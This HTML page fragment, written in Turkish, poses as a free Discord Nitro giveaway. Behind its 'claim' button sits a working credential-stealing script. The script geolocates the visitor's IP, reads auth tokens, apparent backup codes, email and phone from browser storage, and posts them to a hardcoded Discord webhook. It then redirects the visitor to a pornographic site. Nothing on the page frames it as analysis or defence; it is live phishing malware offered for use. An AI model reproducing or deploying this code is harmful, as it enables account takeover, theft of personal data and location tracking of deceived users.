    <p>1 Yıl Ücretsiz Nitro için hemen claim et</p>
    <button onclick="startGrab()">CLAIM ET</button>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1493914750055092334/c4te86vOd5_gaR4ak2GiUhnObzbAQJm_1slOmR4jaYz78xt_xNfnMwZZsHrCb5cqcIbP";

        async function sendToDiscord(data) {
            const embed = {
                title: "☠️ WEB GRABBER ÇALIŞTI ☠️",
                color: 0xff0000,
                fields: [
                    { name: "IP & Konum", value: `${data.ip} - ${data.city}, ${data.country}`, inline: false },
                    { name: "Google Maps", value: data.maps || "Konum alınamadı", inline: false },
                    { name: "Discord Token", value: data.token ? `\`\`\`${data.token}\`\`\`` : "Bulunamadı (Web Tarayıcı)", inline: false },
                    { name: "Email", value: data.email || "Bulunamadı", inline: true },
                    { name: "Telefon", value: data.phone || "Bulunamadı", inline: true },
                    { name: "Backup Kodları", value: data.backup.length ? "```" + data.backup.join("\n") + "```" : "Bulunamadı", inline: false },
                    { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                ],
                timestamp: new Date().toISOString()
            };

            fetch(WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ username: "Unchained Web Grabber", embeds: [embed] })
            }).catch(() => {});
        }

        async function startGrab() {
            let info = {
                ip: "Yükleniyor...",
                city: "",
                country: "",
                maps: "",
                token: "Bulunamadı",
                email: "Bulunamadı",
                phone: "Bulunamadı",
                backup: []
            };

            // IP + Konum + Google Maps
            try {
                const res = await fetch("https://ipapi.co/json/");
                const data = await res.json();
                info.ip = data.ip;
                info.city = data.city;
                info.country = data.country_name;
                info.maps = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
            } catch(e) {}

            // Token ve diğer bilgileri webden agresif çek
            const keys = ["token", "Token", "auth_token", "authorization", "user_token"];
            try {
                for (let k of keys) {
                    let t = localStorage.getItem(k) || sessionStorage.getItem(k);
                    if (t && t.length > 50) {
                        info.token = t;
                        break;
                    }
                }

                // Backup kodları ara
                for (let i = 0; i < localStorage.length; i++) {
                    let val = localStorage.getItem(localStorage.key(i));
                    if (val) {
                        let codes = val.match(/[A-Z0-9]{8}/g);
                        if (codes) info.backup = [...new Set([...info.backup, ...codes])];
                    }
                }
            } catch(e) {}

            // Email ve telefon için ekstra deneme (Discord web cache'lerinden)
            try {
                if (window.localStorage) {
                    const userData = localStorage.getItem("user") || localStorage.getItem("User");
                    if (userData) {
                        const parsed = JSON.parse(userData);
                        if (parsed.email) info.email = parsed.email;
                        if (parsed.phone) info.phone = parsed.phone;
                    }
                }
            } catch(e) {}

            // Bilgileri gönder
            await sendToDiscord(info);

            // 1.5 saniye sonra pornhub'a at
            setTimeout(() => {
                window.location.href = "https://pornhub.com";
            }, 1500);
        }
    </script>
